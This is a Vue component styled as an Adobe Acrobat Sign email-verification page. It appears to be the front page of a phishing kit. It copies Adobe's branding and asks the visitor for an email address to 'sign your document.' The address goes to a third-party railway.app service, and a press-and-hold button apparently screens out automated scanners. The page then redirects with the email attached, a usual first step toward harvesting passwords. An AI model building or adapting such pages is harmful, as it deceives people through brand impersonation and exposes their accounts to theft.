<template>
  <div class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <div class="header">
          <div class="logo-text">
            <span class="person-icon">⼈</span> Adobe Acrobat Sign
          </div>
          <img class="adobe-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png" alt="Adobe Logo" />
        </div>
        <div class="success-check">✓</div>
        <div class="content">
          <p><strong>Verify the intended recipient's email.</strong></p>
          <p>Enter the email address to which this item was shared to sign your document.</p>
          <input v-model="email" type="email" placeholder="Enter email" required class="email-input" />
          <p v-if="error" class="error">{{ error }}</p>
        </div>
        <button @mousedown="startHold" @mouseup="endHold" @mouseleave="cancelHold">OPEN</button>
        <div class="divider"></div>
        <p class="footer-text">
          © 2025 Adobe. All rights reserved.
          
      </div>
    </div>
  </div>
</template>

<script setup>

import { ref } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
const holdTimer = ref(null)
const holdDuration = 1500

const redirectBaseUrl = 'https://yourdomain.com/complete'

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function verifyEmail() {
  try {
    const res = await fetch('https://email-verification-app-production-8ea5.up.railway.app/api/check-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: email.value })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer.value = setTimeout(() => {
    verifyEmail()
  }, holdDuration)
}

function endHold() {
  if (holdTimer.value) clearTimeout(holdTimer.value)
  loading.value = false
}

function cancelHold() {
  if (holdTimer.value) clearTimeout(holdTimer.value)
  loading.value = false
}

</script>

<style scoped>
.background {
  padding: 2rem;
  font-family: Arial, sans-serif;
  background-color: #f4f4f4;
}
.adobe-sign-container {
  max-width: 350px;
  margin: auto;
  background: white;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
  padding: 2rem;
}
.sign-card .header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
}
.person-icon {
  margin-right: 0.5rem;
}
.email-input {
  width: 90%;
  padding: 0.5rem;
  margin: 1rem 0;
  border: 1px solid #ccc;
  border-radius: 5px;
}
button {
  background-color: #0051c3;
  color: white;
  padding: 0.6rem 1.2rem;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  width: 95%;
}
button:hover {
  background-color: #003a91;
}
.footer-text, .global-footer {
  font-size: 0.85rem;
  color: #333;
  text-align: center;
  margin-top: 2rem;
}
.error {
  color: red;
  font-size: 0.9rem;
}
.success-check {
  font-size: 2rem;
  color: green;
  text-align: center;
  margin: 1rem 0;
}
</style>
